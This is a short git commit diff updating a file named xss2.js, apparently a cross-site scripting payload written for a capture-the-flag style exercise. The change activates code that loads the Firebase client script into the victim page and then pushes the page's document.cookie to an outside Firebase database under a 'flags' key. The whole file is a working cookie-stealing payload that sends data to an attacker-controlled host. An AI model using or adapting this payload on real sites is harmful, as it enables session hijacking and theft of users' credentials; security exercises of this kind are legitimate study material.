a9b88ff697303f4b34bd064a303874b795c3b1b7
Martin Praznovsky <martin.praznovsky@gmail.com>
2016-02-22 17:23:14 +0100

    Update xss2.js

--- xss/xss2.js
+++ xss/xss2.js
@@ -1,9 +1,9 @@
-//var script = document.createElement('script');
-//script.type = 'text/javascript';
-//script.src = 'http://cdn.firebase.com/js/client/2.4.0/firebase.js';
-//document.head.appendChild(script);
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = 'http://cdn.firebase.com:80/js/client/2.4.0/firebase.js';
+document.head.appendChild(script);
+
 
 var myFirebaseRef = new Firebase("http://przno-test.firebaseio.com:80/");
 var flags = myFirebaseRef.child("flags");
-
 flags.push().set({flag: document.cookie})
